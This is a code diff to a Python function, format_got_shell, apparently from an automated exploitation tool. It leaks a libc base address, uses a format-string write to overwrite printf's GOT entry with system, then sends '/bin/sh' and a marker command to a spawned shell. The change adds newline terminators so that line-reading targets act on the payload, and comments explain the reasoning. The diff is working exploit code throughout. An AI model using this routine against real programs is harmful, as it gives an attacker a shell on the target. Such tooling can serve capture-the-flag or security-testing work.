@@ -904,16 +904,25 @@ def format_got_shell(exe, workdir, *, got_slot, system_off, leak_got=None, leak_
             base = int.from_bytes(raw.ljust(8, b"\x00"), "little") - lo
             if base <= 0 or (base & 0xFFF):              # not page-aligned -> wrong leak, retry
                 continue
-            # 3) overwrite the sink's printf@GOT with system
+            # 3) overwrite the sink's printf@GOT with system. The payload must be delivered as a
+            # COMPLETE LINE: the common format-string sink reads with fgets/scanf and does not act
+            # until it sees a newline, so an unterminated write just blocks there and no overwrite
+            # happens (the "format GOT->system did not spawn a shell" dead end). The trailing NUL
+            # bytes of the packed address table stop printf's own parse before the newline, so the
+            # terminator is harmless to the write itself and also fine for a read()-based sink.
+            write_payload = fmt.fmtstr_payload(arg_off, {got_slot: base + system_off})
+            if not write_payload:                        # fixed point did not converge: give up this try
+                continue
             try:
-                p.stdin.write(fmt.fmtstr_payload(arg_off, {got_slot: base + system_off}))
-                p.stdin.flush()
+                p.stdin.write(write_payload + b"\n"); p.stdin.flush()
             except (BrokenPipeError, OSError):
                 continue
             _read_until(p, time.time() + timeout / 3)
-            # 4) next printf(buf) == system(buf): hand it "/bin/sh", then drive the shell
+            # 4) next printf(buf) == system(buf): hand it "/bin/sh" as its own line (newline so a
+            # line-reading sink consumes it; the NUL ends the string so system sees exactly
+            # "/bin/sh"), then drive the shell with the forgery-proof marker command.
             try:
-                p.stdin.write(b"/bin/sh\x00"); p.stdin.flush()
+                p.stdin.write(b"/bin/sh\x00\n"); p.stdin.flush()
                 time.sleep(0.3)
                 p.stdin.write(markers.command + b"\n"); p.stdin.flush()
             except (BrokenPipeError, OSError):
